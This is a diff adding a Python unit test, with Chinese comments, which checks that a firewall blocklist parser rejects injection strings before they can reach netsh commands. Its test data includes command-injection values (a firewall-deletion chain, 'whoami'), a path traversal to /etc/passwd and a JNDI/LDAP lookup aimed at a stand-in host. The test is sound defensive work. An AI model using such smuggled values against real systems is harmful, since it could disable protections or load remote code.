@@ -335,3 +335,38 @@ def test_precise_ip_normalizes_host_networks():
     assert precise_ip("1.2.3.4/32") == "1.2.3.4"
     assert precise_ip("1.2.3.0/24") is None
     assert precise_ip("垃圾") is None
+
+
+# ═══════════════════════════════════════════════════════════
+#  _IPSet：名单是注入面的最后一道闸
+# ═══════════════════════════════════════════════════════════
+
+
+def test_ipset_rejects_injection_entries(tmp_path):
+    """名单文件可能被手工编辑/外部导入污染：解析不了的条目必须被静默拒绝，
+    绝不能落盘（save_file 的内容之后会进 netsh 命令行）。
+
+    变异：把 _IPSet.add 的 except 分支改成无条件 return True → 本例变红
+    （注入串进了 entries()）。
+    """
+    from core.rule_engine import _IPSet
+
+    evil = [
+        "1.2.3.4; netsh advfirewall delete allprofiles",
+        "1.2.3.4 & whoami",
+        "1.2.3.4/../../etc/passwd",
+        "${jndi:ldap://evil}",
+        "1.2.3.4\n1.2.3.5",
+    ]
+    s = _IPSet(evil)
+    assert s.entries() == [], f"注入串不能进集合：{s.entries()}"
+    assert "1.2.3.4" not in s  # 前缀也不能被当成有效成员
+
+    # 正常条目不受影响；合法条目落盘后读回来一致
+    s.add("192.0.2.9")
+    s.add("10.0.0.0/8")
+    p = tmp_path / "bl.json"
+    s.save_file(str(p))
+    back = _IPSet.load_file(str(p))
+    assert back.entries() == s.entries()
+    assert "192.0.2.9" in back and "10.1.2.3" in back
